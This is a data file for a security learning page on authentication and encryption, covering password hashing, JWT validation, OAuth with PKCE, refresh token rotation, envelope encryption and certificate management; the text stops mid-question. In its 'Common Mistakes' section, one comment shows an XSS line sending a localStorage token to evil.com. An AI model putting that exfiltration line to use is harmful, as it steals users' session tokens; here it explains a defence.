/* ═══════════════════════════════════════════════════════════════════
   Security — Authentication & Encryption
   ═══════════════════════════════════════════════════════════════════ */
'use strict';

PageData.register('security-auth', {
    title: 'Auth & Encryption',
    description: 'JWT deep-dive, OAuth 2.0 flows, password hashing, encryption at rest and in transit, certificate management, and secret management patterns.',
    sections: [
        {
            title: 'Password Hashing & Token Security',
            content: `<p>Secure authentication requires proper password storage (adaptive hashing) and secure token generation/validation.</p>`,
            code: `// PASSWORD HASHING — never store plain text or simple hashes!
// Use adaptive hashing algorithms that are intentionally SLOW:

// ASP.NET Core Identity (uses PBKDF2 by default):
var hasher = new PasswordHasher<User>();
string hash = hasher.HashPassword(user, "plaintext-password");
// Returns: base64(salt + PBKDF2-SHA256(password, salt, 100000 iterations))

var result = hasher.VerifyHashedPassword(user, hash, "attempt");
// Returns: Success, Failed, or SuccessRehashNeeded

// Alternatively: bcrypt (widely used, built-in work factor)
// Or: Argon2id (winner of Password Hashing Competition, memory-hard)

// Algorithm comparison:
// MD5/SHA-256: NEVER for passwords (too fast — billions/sec on GPU)
// PBKDF2: OK (CPU-hard, configurable iterations, FIPS compliant)
// bcrypt: Good (memory-hard, 72-byte limit, widely supported)
// Argon2id: Best (memory-hard + CPU-hard, configurable, modern)

// TOKEN SECURITY:
// Access tokens: short-lived (5-15 min), stateless (JWT)
// Refresh tokens: long-lived (7-30d), stateful (stored server-side)
// API keys: long-lived, scoped, revocable, stored as hashes

// Secure random token generation:
var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
// Store hash of refresh token, not the token itself:
var tokenHash = SHA256.HashData(Encoding.UTF8.GetBytes(token));

// Token rotation: issue new refresh token on each use, invalidate old one
// Prevents: stolen refresh token replay (old token becomes invalid)`,
            language: 'csharp'
        },
        {
            title: 'Encryption: At Rest & In Transit',
            content: `<p>Data protection requires encryption at rest (stored data) and in transit (network communication). Use industry-standard algorithms, never invent your own crypto.</p>`,
            code: `// ENCRYPTION IN TRANSIT — TLS 1.3
// Enforce HTTPS everywhere:
builder.Services.AddHsts(options => {
    options.MaxAge = TimeSpan.FromDays(365);
    options.IncludeSubDomains = true;
    options.Preload = true;
});
app.UseHttpsRedirection();
app.UseHsts();

// ENCRYPTION AT REST — ASP.NET Core Data Protection API
// Protects: cookies, antiforgery tokens, TempData, custom sensitive data
builder.Services.AddDataProtection()
    .PersistKeysToAzureBlobStorage(blobUri)
    .ProtectKeysWithAzureKeyVault(keyUri, credential);

// Encrypt/decrypt custom data:
var protector = dataProtectionProvider.CreateProtector("MyApp.Sensitive");
string encrypted = protector.Protect("sensitive-data");
string decrypted = protector.Unprotect(encrypted);

// DATABASE ENCRYPTION:
// Azure SQL: Transparent Data Encryption (TDE) — automatic, zero code change
// Column-level: Always Encrypted (client-side, server never sees plaintext)
// Application-level: encrypt before storing, decrypt after reading

// SYMMETRIC ENCRYPTION (AES-256-GCM for application-level):
using var aes = Aes.Create();
aes.KeySize = 256;
aes.GenerateKey(); // Store key in Key Vault!

public byte[] Encrypt(byte[] plaintext, byte[] key)
{
    using var aes = Aes.Create();
    aes.Key = key;
    aes.GenerateIV();
    using var encryptor = aes.CreateEncryptor();
    var ciphertext = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
    return aes.IV.Concat(ciphertext).ToArray(); // Prepend IV
}

// Key management: NEVER hardcode keys
// Use: Azure Key Vault, AWS KMS, HashiCorp Vault
// Rotate keys periodically (Key Vault supports auto-rotation)`,
            language: 'csharp'
        },
        {
            title: 'Best Practices',
            content: `<p>Security is defense-in-depth. Follow these practices to protect authentication and authorization flows:</p>
            <ul>
                <li><strong>Short-lived access tokens (5–15 min)</strong> — limits the window of a stolen token. Pair with refresh tokens for session continuity.</li>
                <li><strong>Refresh token rotation</strong> — issue a new refresh token on every use and invalidate the old one. Detect reuse as a compromise signal and revoke the family.</li>
                <li><strong>Store secrets in Key Vault / KMS</strong> — never in code, config files, or environment variables on shared machines. Use managed identity to access the vault.</li>
                <li><strong>Use HTTPS everywhere</strong> — enforce HSTS, redirect HTTP to HTTPS, use TLS 1.2+ minimum. No exceptions, even for internal services (use mTLS).</li>
                <li><strong>Validate all JWT claims on every request</strong> — issuer, audience, expiry, not-before, and algorithm. Pin allowed algorithms; reject <code>alg: none</code>.</li>
                <li><strong>Implement token revocation</strong> — short-lived tokens reduce the need, but for high-assurance operations maintain a deny-list or use reference tokens with introspection.</li>
            </ul>`,
            code: `// Short-lived access token + refresh rotation
services.AddAuthentication().AddJwtBearer(options => {
    options.TokenValidationParameters = new TokenValidationParameters {
        ValidateIssuer = true,
        ValidateAudience = true,
        ValidateLifetime = true,
        ClockSkew = TimeSpan.FromSeconds(30), // tighten from 5-min default
        ValidAlgorithms = new[] { "RS256" }   // pin algorithm
    };
});

// Store secrets in Azure Key Vault with managed identity
builder.Configuration.AddAzureKeyVault(
    new Uri("https://my-vault.vault.azure.net/"),
    new DefaultAzureCredential());

// Never do this:
// var secret = "hardcoded-signing-key"; // committed to source control!`,
            language: 'csharp'
        },
        {
            title: 'Common Mistakes',
            content: `<p>These errors create real security vulnerabilities — many are subtle and pass code review if reviewers aren't security-aware:</p>
            <ul>
                <li><strong>Storing JWT in localStorage</strong> — accessible to any JavaScript on the page. A single XSS vulnerability exfiltrates all tokens. Use httpOnly cookies or a BFF pattern instead.</li>
                <li><strong>Not validating token audience/issuer</strong> — a valid token minted for a different API or issuer is accepted, allowing cross-service token replay attacks.</li>
                <li><strong>Long-lived tokens without refresh</strong> — a 30-day access token that cannot be revoked gives an attacker a month of access from a single theft.</li>
                <li><strong>Shared signing keys across environments</strong> — a token minted in dev/staging works in production. Use per-environment keys and validate issuer strictly.</li>
                <li><strong>No token revocation mechanism</strong> — when a user changes password or an admin deactivates an account, existing tokens continue to work until natural expiry.</li>
            </ul>`,
            code: `// WRONG: JWT in localStorage (XSS can steal it)
localStorage.setItem('token', response.accessToken);
// Any injected script: fetch('https://evil.com?t=' + localStorage.getItem('token'))

// BETTER: httpOnly secure cookie (not accessible to JS)
services.AddAuthentication().AddCookie(options => {
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
});

// WRONG: Same signing key in dev and production
// A token generated with: dotnet user-jwts create --scope admin
// would be accepted by production if keys match!

// RIGHT: Per-environment keys, strict issuer validation
ValidIssuer = "https://auth.production.example.com" // rejects dev tokens`,
            language: 'csharp'
        },
        {
            title: 'Interview Tips',
            content: '<p>Security interviews test depth of understanding, not just "use JWT."</p>',
            callout: { type: 'tip', title: 'What Interviewers Look For', text: 'Know the full OAuth 2.0 Authorization Code + PKCE flow end-to-end. Explain token vs session trade-offs clearly: tokens are stateless (scalable, but hard to revoke) vs sessions are stateful (easy to revoke, but require server storage). Describe refresh token rotation and WHY it matters — reuse detection as a compromise signal. Understand that JWT claims (iss, aud, exp) must ALL be validated, not just the signature. Distinguish authentication (who you are) from authorization (what you can do) — conflating them is the most common interview mistake.' }
        },
        {
            title: 'Key Takeaways',
            content: `<ul>
                <li><strong>Authentication = who you are; Authorization = what you can do</strong> — they are separate concerns that must be addressed independently.</li>
                <li><strong>JWT is stateless (pros and cons)</strong> — scales horizontally without session stores, but cannot be revoked before expiry without additional infrastructure.</li>
                <li><strong>Always validate tokens server-side</strong> — check signature, issuer, audience, expiry, and algorithm on every request. Client-side checks are insufficient.</li>
                <li><strong>Defense in depth</strong> — no single control is sufficient. Layer: strong hashing, short-lived tokens, refresh rotation, MFA, rate limiting, anomaly detection.</li>
                <li><strong>Secrets belong in vaults, not code</strong> — use Azure Key Vault, AWS KMS, or HashiCorp Vault with managed identity. Rotate keys regularly.</li>
            </ul>`
        }
    ],
    questions: [
        {
            question: 'How should passwords be stored securely? Compare hashing algorithms.',
            difficulty: 'medium',
            answer: `<p>Passwords must be stored as <strong>salted adaptive hashes</strong> — never plain text, never simple hashes (MD5/SHA). Use Argon2id (best), bcrypt (good), or PBKDF2 (acceptable). These are intentionally slow (configurable work factor) to resist brute-force attacks even if the database is compromised.</p>`,
            bestPractices: ['Use Argon2id or bcrypt for new systems (memory-hard, resistant to GPU attacks)', 'Always use a unique salt per password (prevents rainbow table attacks)', 'Increase work factor over time as hardware gets faster', 'Use ASP.NET Core Identity PasswordHasher (handles salt + iterations automatically)'],
            commonMistakes: ['Storing passwords as MD5/SHA-256 (crackable in seconds with GPU)', 'Using the same salt for all passwords (enables rainbow tables)', 'Not increasing work factor as hardware improves', 'Encrypting passwords instead of hashing (encryption is reversible — hashing is not)'],
            interviewTip: 'Key distinction: encryption is reversible (decrypt with key), hashing is one-way (cannot recover original). Passwords should be HASHED not encrypted — you never need the original password, only to verify if an attempt matches.',
            followUp: ['What is a salt and why is it needed?', 'What is a rainbow table attack?', 'How does Argon2id differ from bcrypt?'],
            seniorPerspective: 'I use ASP.NET Core Identity which handles password hashing correctly out of the box. For new standalone services, I configure Argon2id via the Konscious.Security.Cryptography package. The work factor should target ~250ms per hash on your production hardware.',
            architectPerspective: 'Password security is a defense-in-depth problem: hashing (last line of defense if DB compromised), rate limiting login attempts, MFA (makes stolen password insufficient), breach detection (Have I Been Pwned integration), and credential stuffing protection (device fingerprinting + anomaly detection).'
        },
        {
            question: 'Walk through validating a JWT on the resource server. What must you check beyond the signature?',
            difficulty: 'hard',
            answer: `<p>Signature validation proves integrity, but a fully validated JWT requires checking the <strong>claims</strong> too:</p><ul><li><strong>Signature:</strong> verify with the issuer's public key (asymmetric, RS256/ES256) fetched from the JWKS endpoint and selected by the <code>kid</code> header. Reject <code>alg: none</code> and never let the token dictate the algorithm.</li><li><strong>Issuer (<code>iss</code>):</strong> must match the trusted authority exactly.</li><li><strong>Audience (<code>aud</code>):</strong> must contain this API's identifier — prevents a token minted for another service being replayed here.</li><li><strong>Expiry/not-before (<code>exp</code>, <code>nbf</code>):</strong> reject expired or not-yet-valid tokens, allowing a small clock skew.</li><li><strong>Scopes/roles:</strong> authorization is separate from authentication — a valid token still needs the right <code>scope</code>/role for the operation.</li></ul><p>JWTs are <strong>stateless</strong>, so they cannot be revoked before expiry on their own — pair short lifetimes with a revocation/denylist or reference-token introspection when immediate revocation matters.</p>`,
            explanation: 'A JWT is like a tamper-proof wristband at a festival: checking the hologram (signature) proves it is genuine, but you still must confirm it is for THIS stage (audience), issued by THIS festival (issuer), and not expired — a real wristband for a different event still should not get you in.',
            code: `builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.Authority = "https://login.example.com";  // JWKS auto-discovered
        options.Audience  = "api://my-resource-server";
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidIssuer = "https://login.example.com",
            ValidateAudience = true,
            ValidAudience = "api://my-resource-server",
            ValidateLifetime = true,
            ClockSkew = TimeSpan.FromSeconds(30),     // tighten from 5-min default
            ValidateIssuerSigningKey = true,
            ValidAlgorithms = new[] { "RS256" }        // pin algorithm; block 'none'
        };
    });

// Authorization is separate from authentication:
[Authorize(Policy = "orders.write")]
public IActionResult CreateOrder() => Ok();`,
            language: 'csharp',
            bestPractices: ['Pin allowed algorithms and reject alg:none and HS/RS confusion', 'Validate iss, aud, exp, and nbf — not just the signature', 'Fetch signing keys from JWKS and cache with rotation support via kid', 'Keep access tokens short-lived and enforce scopes/roles for authorization'],
            commonMistakes: ['Trusting the alg header from the token (algorithm-confusion attack)', 'Validating signature but ignoring audience, allowing token reuse across APIs', 'Putting sensitive data in the JWT payload (it is base64, not encrypted)', 'Treating a valid token as authorization without checking scopes/roles'],
            interviewTip: 'Say explicitly that a JWT payload is encoded, not encrypted, and that authentication (valid token) is not authorization (right scope) — conflating the two is the most common mistake interviewers probe for.',
            followUp: ['What is the algorithm-confusion (RS256/HS256) attack?', 'How do you revoke a JWT before it expires?', 'What is the role of the kid header and JWKS rotation?'],
            seniorPerspective: 'I have seen an outage caused by a 5-minute default clock skew masking a misconfigured NTP server — tightening ClockSkew and fixing time sync surfaced the real issue. I also always pin ValidAlgorithms; an API that accepts whatever alg the token claims is one library default away from an algorithm-confusion bypass.',
            architectPerspective: 'The stateless nature of JWTs is the core architectural trade-off: you gain horizontal scalability (no central session lookup) but lose instant revocation. I resolve that per-context — short access tokens plus refresh rotation for most APIs, and reference tokens with introspection for high-assurance operations like payments where immediate revocation is non-negotiable.'
        },
        {
            question: 'Compare OAuth 2.0 and OpenID Connect. Why is Authorization Code with PKCE the recommended flow for SPAs and mobile apps?',
            difficulty: 'advanced',
            answer: `<p><strong>OAuth 2.0</strong> is an <em>authorization</em> framework — it issues access tokens that let a client call APIs on a user's behalf; it says nothing standard about <em>who the user is</em>. <strong>OpenID Connect (OIDC)</strong> is a thin identity layer on top of OAuth 2.0 that adds an <strong>ID token</strong> (a JWT describing the authenticated user) and a standardized <code>/userinfo</code> endpoint. Rule of thumb: OAuth for access (authorization), OIDC for login (authentication).</p><p><strong>Authorization Code + PKCE</strong> is recommended for public clients (SPAs, mobile) because:</p><ul><li>The token is exchanged at the token endpoint (back channel), not exposed in the URL like the deprecated <strong>implicit flow</strong>.</li><li><strong>PKCE</strong> (Proof Key for Code Exchange) binds the authorization code to the client: the client sends a hashed <code>code_challenge</code> up front and the original <code>code_verifier</code> at exchange. A stolen code is useless without the verifier, defeating authorization-code interception.</li><li>It works without a client secret, which public clients cannot keep confidential anyway.</li></ul>`,
            explanation: 'OAuth is handing someone a valet key that lets them park your car but not open the trunk; OIDC adds an ID badge that proves who they are. PKCE is like sealing the valet key in an envelope only you can open — even if someone snatches the ticket stub, they cannot use the key.',
            code: `// PKCE: client generates a verifier and its SHA-256 challenge
const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
const challenge = base64url(await crypto.subtle.digest('SHA-256',
                  new TextEncoder().encode(verifier)));

// 1) Authorization request (front channel)
const authUrl =
  'https://login.example.com/authorize' +
  '?response_type=code' +
  '&client_id=spa-client' +
  '&redirect_uri=https://app.example.com/callback' +
  '&scope=openid%20profile%20orders.read' +   // openid => OIDC ID token
  '&code_challenge=' + challenge +
  '&code_challenge_method=S256' +
  '&state=' + state + '&nonce=' + nonce;

// 2) Token exchange (back channel) — code + original verifier
await fetch('https://login.example.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code, client_id: 'spa-client',
    redirect_uri: 'https://app.example.com/callback',
    code_verifier: verifier            // proves possession; stolen code alone is useless
  })
});`,
            language: 'typescript',
            bestPractices: ['Use Authorization Code + PKCE for all SPA and mobile (public) clients', 'Request the openid scope and validate the ID token nonce to prevent replay', 'Validate the state parameter to prevent CSRF on the redirect', 'Keep refresh tokens out of localStorage; prefer secure, httpOnly cookies or rotation'],
            commonMistakes: ['Using the deprecated implicit flow (tokens leak via URL/history)', 'Treating the OAuth access token as proof of identity instead of the OIDC ID token', 'Skipping state/nonce validation, opening CSRF and token-replay holes', 'Embedding a client secret in a SPA where it cannot be kept confidential'],
            interviewTip: 'Nail the one-liner — OAuth is authorization, OIDC is authentication — then explain PKCE as binding the code to the client; that combination shows you understand both the protocol roles and the attack it prevents.',
            followUp: ['What attack does the state parameter prevent versus the nonce?', 'Why was the implicit flow deprecated?', 'How do refresh token rotation and the BFF pattern improve SPA security?'],
            seniorPerspective: 'When the implicit flow was deprecated I migrated several SPAs to Authorization Code + PKCE; the practical hurdle was refresh-token storage in the browser. We landed on a backend-for-frontend (BFF) holding tokens in an httpOnly cookie session, which removed tokens from JavaScript reach entirely and neutralized XSS token theft.',
            architectPerspective: 'I treat the identity provider as a centralized trust boundary: every service validates OIDC tokens from one issuer rather than each rolling its own auth. That centralization standardizes login, MFA, and session policy across dozens of apps, and choosing the correct OAuth flow per client type (confidential vs public) is a foundational decision that is expensive to retrofit later.'
        },
        {
            question: 'Explain refresh token rotation with reuse detection. How does it limit the blast radius of a stolen token?',
            difficulty: 'advanced',
            answer: `<p><strong>Refresh token rotation</strong> issues a brand-new refresh token every time one is redeemed and immediately invalidates the old one. Tokens are chained in a <em>family</em> (lineage) tied to the original login.</p><ul><li><strong>Reuse detection:</strong> if an <em>already-used</em> (rotated-out) refresh token is presented again, the server treats it as a compromise signal and revokes the entire token family, forcing re-authentication.</li><li><strong>Why it limits blast radius:</strong> if an attacker steals a refresh token and uses it, the legitimate client's next use presents the now-invalid old token (or vice versa) — the collision is detected and the whole family is killed. The attacker cannot quietly maintain long-term access.</li><li><strong>Storage:</strong> refresh tokens are stateful — store a hash server-side with the family id, issued-at, and a used/revoked flag. Never store the raw token.</li></ul><p>Pair rotation with short access-token lifetimes so a leaked access token also expires quickly.</p>`,
            explanation: 'It is like a relay race where each runner must hand off the baton to get the next one; if two people ever show up holding the same baton, officials know one is an impostor and stop the whole team — so a stolen baton cannot be used quietly for long.',
            code: `public async Task<TokenPair> RefreshAsync(string presentedToken)
{
    var hash = Sha256(presentedToken);
    var stored = await _db.RefreshTokens.SingleOrDefaultAsync(t => t.TokenHash == hash);

    if (stored is null)
        throw new SecurityException("Unknown refresh token");

    // Reuse detection: a token already rotated out is a compromise signal
    if (stored.IsUsed)
    {
        await RevokeFamilyAsync(stored.FamilyId);   // kill entire lineage
        throw new SecurityException("Refresh token reuse detected");
    }

    stored.IsUsed = true;                            // invalidate the old token
    var newRefresh = SecureRandom(32);
    _db.RefreshTokens.Add(new RefreshToken {
        TokenHash = Sha256(newRefresh),
        FamilyId  = stored.FamilyId,                 // keep lineage
        ExpiresAt = DateTime.UtcNow.AddDays(14)
    });
    await _db.SaveChangesAsync();

    return new TokenPair(IssueAccessToken(stored.UserId), newRefresh);
}`,
            language: 'csharp',
            bestPractices: ['Rotate the refresh token on every redemption and invalidate the prior one', 'Track a family/lineage id so reuse can revoke the whole chain', 'Store only hashes of refresh tokens, never the raw value', 'Combine with short-lived access tokens and absolute family expiry'],
            commonMistakes: ['Issuing long-lived refresh tokens that never rotate (single theft = lasting access)', 'Not detecting reuse, so a stolen token works alongside the legitimate one indefinitely', 'Storing raw refresh tokens in the database', 'Putting refresh tokens in localStorage where XSS can exfiltrate them'],
            interviewTip: 'The killer detail is reuse detection revoking the whole family — explaining why an old-token replay implies compromise demonstrates you understand the threat model, not just the mechanic.',
            followUp: ['How do you handle a race where a client retries and accidentally reuses a token?', 'Where should a SPA store refresh tokens?', 'What is an absolute vs sliding expiration for a token family?'],
            seniorPerspective: 'The subtle production issue is benign reuse: a network retry or double-fired request can replay a just-used token and trip reuse detection, logging users out. I add a short grace window or idempotency on the rotation endpoint so genuine retries do not nuke the family, while real out-of-band reuse still does.',
            architectPerspective: 'Refresh rotation reintroduces state into an otherwise stateless token system, so I design the token store for the same availability and latency as auth itself — it is on the critical path for every session. The architectural payoff is a concrete, bounded compromise story: short access-token windows plus family revocation give security a clear answer to "what happens when a token leaks."'
        },
        {
            question: 'Symmetric vs asymmetric encryption — how do you combine them in practice (e.g., TLS, envelope encryption), and why not use one alone?',
            difficulty: 'expert',
            answer: `<p><strong>Symmetric</strong> (AES) uses one shared key for encrypt and decrypt — fast, great for bulk data, but key distribution is the hard problem. <strong>Asymmetric</strong> (RSA, ECC) uses a public/private key pair — solves distribution and enables signatures, but is orders of magnitude slower and size-limited.</p><p>In practice you combine them — <strong>hybrid / envelope encryption</strong>:</p><ul><li><strong>TLS:</strong> the asymmetric handshake (certificate + key exchange like ECDHE) authenticates the server and negotiates a fresh <em>symmetric session key</em>; all bulk traffic is then encrypted symmetrically (AES-GCM/ChaCha20). You get asymmetric's trust + symmetric's speed.</li><li><strong>Envelope encryption (at rest):</strong> data is encrypted with a per-object symmetric <strong>data key (DEK)</strong>; the DEK is itself encrypted by a <strong>key-encryption key (KEK)</strong> held in an HSM/KMS/Key Vault. You store the encrypted DEK alongside the ciphertext. Rotating the KEK only re-wraps DEKs — no need to re-encrypt terabytes.</li></ul><p><strong>Why not one alone:</strong> asymmetric alone is too slow and can't encrypt large payloads; symmetric alone has no safe way to distribute the shared key to a party you've never met.</p>`,
            explanation: 'Asymmetric is a slow but secure armored courier; symmetric is a fast local truck. So you use the armored courier once to deliver a single key, then use the fast truck (with that key) for all the bulk hauling afterward — best of both.',
            code: `// Envelope encryption: KEK in Key Vault wraps a per-object AES data key (DEK)
public async Task<EncryptedBlob> EncryptAsync(byte[] plaintext)
{
    using var aes = Aes.Create();             // symmetric: fast bulk encryption
    aes.KeySize = 256;
    aes.GenerateKey();
    aes.GenerateIV();

    using var enc = aes.CreateEncryptor();
    var ciphertext = enc.TransformFinalBlock(plaintext, 0, plaintext.Length);

    // Wrap (encrypt) the DEK with the KEK held in Key Vault (never leaves HSM)
    var cryptoClient = new CryptographyClient(_kekKeyId, _credential);
    var wrapped = await cryptoClient.WrapKeyAsync(KeyWrapAlgorithm.RsaOaep256, aes.Key);

    return new EncryptedBlob {
        Ciphertext = ciphertext,
        Iv = aes.IV,
        WrappedDataKey = wrapped.EncryptedKey   // store next to ciphertext
    };
    // Rotating the KEK only re-wraps DEKs — no re-encryption of the data itself
}`,
            language: 'csharp',
            bestPractices: ['Use hybrid/envelope encryption: asymmetric to protect keys, symmetric for data', 'Keep the KEK in an HSM/KMS/Key Vault so it never leaves the secure boundary', 'Use authenticated encryption (AES-GCM) and a unique IV/nonce per message', 'Design for key rotation by re-wrapping DEKs rather than re-encrypting bulk data'],
            commonMistakes: ['Using RSA to encrypt large payloads directly (slow, size-limited)', 'Reusing an IV/nonce with the same symmetric key (catastrophic for GCM)', 'Hardcoding or storing the KEK with the data it protects', 'Rolling your own crypto/mode instead of vetted AEAD primitives'],
            interviewTip: 'Lead with "you use both" and explain envelope encryption — naming DEK/KEK and the KEK-rotation-without-re-encryption trick signals real at-rest encryption experience, not textbook recall.',
            followUp: ['Why is IV/nonce uniqueness critical for AES-GCM?', 'How does TLS 1.3 establish the symmetric session key?', 'How does KEK rotation work without re-encrypting all data?'],
            seniorPerspective: 'On a system encrypting millions of records, per-record envelope encryption with KMS-held KEKs meant a mandated annual key rotation was a few hours of re-wrapping DEKs instead of a multi-week re-encryption of the whole datastore. The one thing I guard hardest in review is nonce reuse — a single repeated GCM nonce can unravel the confidentiality and integrity guarantees.',
            architectPerspective: 'Envelope encryption is the standard because it cleanly separates the key hierarchy from the data lifecycle: the HSM/KMS is the single high-value trust anchor (the KEK), while cheap, rotatable DEKs scale with the data. That separation is what makes per-tenant keys, crypto-shredding (delete the key to render data unrecoverable), and compliant rotation tractable at scale.'
        },
        {
            question: 'How do you manage TLS certificates and a private PKI in production \u2014 issuance, rotation, trust, and revocation?',
            difficulty: 'hard',
            answer: `<p>Certificates bind an identity to a public key, signed by a trusted Certificate Authority (CA). Production certificate management is mostly about <strong>automating the lifecycle</strong> so nothing expires unnoticed and trust is verifiable.</p>
            <ul>
                <li><strong>Issuance:</strong> for public endpoints, automate via ACME (e.g., Let\u2019s Encrypt); for internal/mTLS, run a private CA (cert-manager, HashiCorp Vault PKI, cloud CA) issuing short-lived certs.</li>
                <li><strong>Rotation:</strong> prefer short lifetimes with automatic renewal well before expiry. The classic outage is a manually-installed cert silently expiring \u2014 automation plus expiry monitoring/alerting prevents it.</li>
                <li><strong>Trust:</strong> clients validate the chain to a trusted root, the hostname (SAN), validity dates, and (for mTLS) the client cert too. Keep root/intermediate trust stores managed and minimal.</li>
                <li><strong>Revocation:</strong> CRLs and OCSP let a compromised cert be revoked before expiry; OCSP stapling improves performance. Short-lived certs reduce reliance on revocation since the exposure window is small.</li>
                <li><strong>Key protection:</strong> private keys live in an HSM/KMS or secrets manager, never in the repo; rotate the key (not just re-issue the cert) on suspected compromise.</li>
            </ul>`,
            explanation: 'A TLS certificate is a passport: issued by an authority everyone trusts (CA), valid only for a date range and a specific name, and revocable if stolen. Letting one expire is like showing up at the border with an out-of-date passport \u2014 you are turned away no matter who you are, which is exactly how a forgotten cert takes a service offline at midnight.',
            code: `# cert-manager: auto-issue + auto-renew a short-lived internal cert (Kubernetes)
apiVersion: cert-manager.io/v1
kind: Certificate
metadata: { name: payment-tls, namespace: prod }
spec:
  secretName: payment-tls          # private key + cert stored here (mounted by the pod)
  duration: 2160h                  # 90 days
  renewBefore: 720h                # renew 30 days early -> no expiry surprises
  dnsNames: ["payment.prod.svc.cluster.local"]
  issuerRef: { name: internal-ca, kind: ClusterIssuer }
# The controller rotates automatically; alert if any cert is < 14 days from expiry.`,
            language: 'yaml',
            bestPractices: ['Automate issuance and renewal (ACME / cert-manager / Vault PKI)', 'Use short lifetimes and renew well before expiry', 'Monitor and alert on approaching expiry across all certs', 'Store private keys in an HSM/KMS/secret store, never in source'],
            commonMistakes: ['Manually installed certs that silently expire and cause outages', 'No expiry monitoring/alerting across the fleet', 'Long-lived certs with no revocation or rotation plan', 'Committing private keys to the repo or baking them into images'],
            interviewTip: 'Lead with "automate the lifecycle so nothing expires unnoticed" \u2014 the expired-certificate outage is the war story every interviewer recognizes, and short-lived auto-rotated certs are the modern answer.',
            followUp: ['How does OCSP stapling improve over plain OCSP/CRL?', 'Why do short-lived certs reduce the need for revocation?', 'How does mTLS change certificate management vs server-only TLS?'],
            seniorPerspective: 'Almost every certificate incident I have seen was not a crypto failure \u2014 it was a human-installed cert that quietly expired on a weekend. So my entire approach is to remove humans from the renewal path: short-lived certs issued by an automated CA, renewal triggered well before expiry, and an independent alert that fires if anything is within two weeks of expiring regardless of what the automation believes. The shorter the lifetime, the less I have to depend on revocation infrastructure (CRL/OCSP) that is itself fragile.',
            architectPerspective: 'I treat the private CA and key store as a top-tier trust anchor and design the system so certificate identity, not network location, is what authorizes service-to-service traffic. Short-lived, automatically-rotated certificates issued per workload turn certificates into ephemeral identity tokens \u2014 which both enables mTLS-based Zero Trust and shrinks the blast radius of any single key compromise to minutes rather than the years a long-lived cert would expose.'
        },
        {
            question: 'What is the difference between authentication and authorization?',
            difficulty: 'easy',
            answer: `<p><strong>Authentication (AuthN)</strong> answers "Who are you?" \u2014 it verifies identity (login, credentials, tokens). <strong>Authorization (AuthZ)</strong> answers "What are you allowed to do?" \u2014 it checks permissions after identity is established.</p>
<ul>
<li><strong>Authentication</strong>: Username/password, JWT validation, OAuth token, biometrics, MFA. Proves you are who you claim to be.</li>
<li><strong>Authorization</strong>: Role checks, policy evaluation, RBAC/ABAC, claims-based access. Determines what resources/actions the authenticated identity can access.</li>
</ul>
<p>They are separate concerns: you can be authenticated (valid login) but not authorized (no permission for this resource). In ASP.NET Core: <code>[Authorize]</code> requires authentication, <code>[Authorize(Policy = "Admin")]</code> requires specific authorization.</p>`,
            interviewTip: 'Use a simple analogy: authentication is showing your ID at the door (proving who you are), authorization is checking your ticket to see which rooms you can enter. A valid ID does not mean access to every room.',
            followUp: ['Can you have authorization without authentication?', 'How does claims-based identity work in .NET?', 'What is the difference between RBAC and ABAC?'],
            seniorPerspective: 'I enforce both as separate middleware concerns: authentication validates the token/session, then authorization policies evaluate claims/roles against the specific resource. The most common bug is checking authentication but forgetting fine-grained authorization \u2014 any logged-in user can access any resource.',
            architectPerspective: 'Authentication is centralized (one identity provider, one token format), while authorization is distributed (each service enforces its own policies based on claims in the token). This separation scales: adding a new service only requires defining its authorization policies, not touching the auth infrastructure.'
        },
        {
            question: 'Explain OAuth 2.0 flows. When do you use Authorization Code vs Client Credentials vs Device Code?',
            difficulty: 'medium',
            answer: `<p>OAuth 2.0 defines several <strong>grant types</strong> (flows) for different client types and scenarios:</p>
<ul>
<li><strong>Authorization Code + PKCE</strong>: For user-facing apps (SPAs, mobile, server-rendered). User logs in at the identity provider, gets a code, exchanges it for tokens. PKCE prevents code interception. The standard for all interactive logins.</li>
<li><strong>Client Credentials</strong>: For machine-to-machine (service-to-service) communication with no user involved. The service authenticates with its own client_id + secret and gets an access token directly. No user context.</li>
<li><strong>Device Code</strong>: For input-constrained devices (smart TVs, CLI tools, IoT). The device shows a code/URL; the user logs in on another device (phone/laptop) to authorize it.</li>
<li><strong>Resource Owner Password (ROPC)</strong>: DEPRECATED. User gives credentials directly to the client. Only for legacy migration \u2014 bypasses the security benefits of OAuth.</li>
</ul>
<p>Rule: if a user is involved, use Authorization Code + PKCE. If only machines, use Client Credentials. If the device cannot handle browser redirects, use Device Code.</p>`,
            interviewTip: 'Structure your answer by scenario: "Who is the client?" If a user-facing app \u2192 Auth Code + PKCE. If a backend service \u2192 Client Credentials. If a TV/CLI \u2192 Device Code. This shows you understand the design decisions, not just the protocol mechanics.',
            followUp: ['Why was the Implicit flow deprecated?', 'How does PKCE protect the authorization code?', 'Can Client Credentials flow include user context?'],
            seniorPerspective: 'I default to Authorization Code + PKCE for everything user-facing \u2014 even server-rendered apps that could use a confidential client, because PKCE adds defense-in-depth. For service-to-service, Client Credentials with short-lived tokens and certificate-based client authentication (instead of shared secrets) is my standard.',
            architectPerspective: 'The flow selection is an architectural decision that determines the trust model: Authorization Code keeps credentials at the IdP (users never share passwords with apps), Client Credentials enables zero-trust service mesh identity, and Device Code solves the input-constrained problem without compromising security. I document which flow each client type uses and enforce it at the IdP configuration level.'
        },
        {
            question: 'How does JWT work? What are the security considerations for token storage and validation?',
            difficulty: 'hard',
            answer: `<p>A <strong>JWT (JSON Web Token)</strong> is a compact, self-contained token with three Base64URL-encoded parts: <code>header.payload.signature</code>.</p>
<ul>
<li><strong>Header</strong>: Algorithm (RS256, ES256) and token type.</li>
<li><strong>Payload</strong>: Claims (iss, sub, aud, exp, custom claims). NOT encrypted \u2014 anyone can decode and read it.</li>
<li><strong>Signature</strong>: Cryptographic proof of integrity. Verifier uses the issuer's public key (asymmetric) or shared secret (symmetric) to confirm the token was not tampered with.</li>
</ul>
<p><strong>Security considerations:</strong></p>
<ul>
